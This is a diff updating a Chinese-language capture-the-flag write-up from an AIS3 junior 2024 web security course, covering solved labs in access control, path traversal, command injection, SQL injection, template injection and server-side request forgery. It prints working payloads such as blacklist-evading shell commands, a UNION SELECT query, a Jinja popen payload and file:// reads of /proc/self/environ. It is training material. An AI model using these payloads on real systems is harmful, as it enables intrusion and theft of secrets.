@@ -1,9 +1,14 @@
 ---
-title: AIS3 junior DAY2 上午 網頁安全
-date: 2024-08-18 14:01:40
+title: AIS3 junior DAY2 網頁安全 writeup
+date: 2024-10-07 01:15:33
 tags: writeup
 categories: 2024 AIS3 junior
+swiper_index: 1
+top_group_index: 1
+background: "#fff"
 ---
+# AIS3 junior DAY2 上午 網頁安全
+[TOC]
 
 ## 01 - Broken Access Control
 
@@ -13,7 +18,7 @@ categories: 2024 AIS3 junior
 查看url http://ctfd-ais3.crazyfirelee.tw:9001/user
 將`user`改成`admin`
 ![image](https://hackmd.io/_uploads/B1X-5r3cA.png)
->AIS3_Junior{FirstBROKENAccessControl;)}
+>AIS3_Junior{FirstBROKENAccessControl;}
 
 ### BAC02
 
@@ -124,6 +129,7 @@ curl http://ctfd-ais3.crazyfirelee.tw:9003/admin
 ![image](https://hackmd.io/_uploads/S17ngDnqR.png)
 >AIS3_Junior{../../../../tmp/BADBAD.php?LFI=SUCCESS}
 
+
 ## 05 - Command Injection
 
 ### CMD01
@@ -146,7 +152,7 @@ curl http://ctfd-ais3.crazyfirelee.tw:9003/admin
 ![image](https://hackmd.io/_uploads/H1s_CwhcC.png)
 找到FLAG
 用`;c\at F*`繞過黑名單 當作`cat FLAG` 得到flag
->AIS3_Junior{niceWordBL$()ACKListEvasion;)}
+>AIS3_Junior{niceWordBL$()ACKListEvasion;}
 
 ### CMD03
 * 用`$(l${x}s|base64${IFS}-w${IFS}0)` 繞過黑名單 
@@ -176,6 +182,8 @@ RkxBRwptYWluLnB5CnByZXN0YXJ0LnNoCnJlcXVpcmVtZW50cy50eHQKc3RhdGljCnRlbXBsYXRlcwp1
 ![image](https://hackmd.io/_uploads/HkbxuJpq0.png)
 *`QUlTM19KdW5pb3J7b3VvX2hpaGl9Cg==`用base64線上解密
 ![image](https://hackmd.io/_uploads/BkAmuk6q0.png)
+
+
 
 
 ## 06 - SQL Injection
@@ -231,7 +239,6 @@ pp' UNION SELECT id,username,password,isAdmin from ApexPredators.users#
 登入後就得到flag
 ![image](https://hackmd.io/_uploads/rJFf5ba9A.png)
 
-
 ## 07 - Server-Side Template Injection
 
 ### STI01
@@ -273,3 +280,45 @@ payload:`{{request.application.__globals__.__builtins__.__import__('os').popen('
 >AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}
 
 
+## 08 - Server-Side Request Forgery
+
+### SRF01
+* 題目有提示 `Flag Location : /app/FLAG`
+* 發現可以用`file:// 表示這是一個本地文件的路徑`來去看題目給的路徑
+* 於是我們直接在網站payload ->`file:///app/FLAG`
+
+![image](https://hackmd.io/_uploads/Sy_n9dh90.png)
+
+點擊右邊的圖片的原始碼
+![image](https://hackmd.io/_uploads/B1Slsu3qC.png)
+可以發現有一個被base64加密的東西
+`QUlTM19KdW5pb3J7ZmlsZTovL1NTUkZfX19YREREfQ==`
+線上解密之後拿到flag
+![image](https://hackmd.io/_uploads/ryqLju2qC.png)
+>AIS3_Junior{file://SSRF___XDDD}
+
+### SRF02
+參考資料 https://github.com/w181496/Web-CTF-Cheatsheet
+![image](https://hackmd.io/_uploads/By27jWaqA.png)
+
+```
+/proc/self/environ #可查看當下進程的環境變量
+```
+* 跟上題一樣用`file://`
+* payload=`file:///proc/self/environ`
+
+![image](https://hackmd.io/_uploads/Byg3s-65C.png)
+
+* 查看圖片原始檔
+![image](https://hackmd.io/_uploads/Sk_khba5R.png)
+
+發現有base64加密的內容
+
+```
+SE9TVE5BTUU9MTIzMWRlMGVjMjZlAFBZVEhPTl9QSVBfVkVSU0lPTj0yMy4wLjEASE9NRT0vcm9vdABQWVRIT05VTkJVRkZFUkVEPTEAR1BHX0tFWT1BMDM1QzhDMTkyMTlCQTgyMUVDRUE4NkI2NEU2MjhGOEQ2ODQ2OTZEAFVXU0dJX0lOST0vYXBwL3V3c2dpLmluaQBOR0lOWF9NQVhfVVBMT0FEPTAAVVdTR0lfUFJPQ0VTU0VTPTE2AFBZVEhPTkRPTlRXUklURUJZVEVDT0RFPTEAU1RBVElDX1VSTD0vc3RhdGljAFBZVEhPTl9HRVRfUElQX1VSTD1odHRwczovL2dpdGh1Yi5jb20vcHlwYS9nZXQtcGlwL3Jhdy82NmQ4YTBmNjM3MDgzZTJjM2RkZmZjMGNiMWU2NWNlMTI2YWZiODU2L3B1YmxpYy9nZXQtcGlwLnB5AFVXU0dJX0NIRUFQRVI9MgBQQVRIPS91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbgBMQU5HPUMuVVRGLTgAUFlUSE9OX1ZFUlNJT049My4xMC4xNABQWVRIT05fU0VUVVBUT09MU19WRVJTSU9OPTY1LjUuMQBOR0lOWF9XT1JLRVJfUFJPQ0VTU0VTPTEATElTVEVOX1BPUlQ9ODAAU1RBVElDX0lOREVYPTAAUFdEPS9hcHAAUFlUSE9OX0dFVF9QSVBfU0hBMjU2PTZmYjdiNzgxMjA2MzU2ZjQ1YWQ3OWVmYmIxOTMyMmNhYTZjMmE1YWQzOTA5MmQwZDQ0ZDBmZWM5NDExN2UxMTgAU1RBVElDX1BBVEg9L2FwcC9zdGF0aWMAUFlUSE9OUEFUSD0vYXBwAEZMQUc9QUlTM19KdW5pb3J7aHR0cDovL0JST0FjY2Vzc0xPQ0FMfQA=
+```
+
+* 放到線上平台解密
+* 得到flag
+![image](https://hackmd.io/_uploads/ByRI2-pcA.png)
+>AIS3_Junior{http://BROAccessLOCAL}
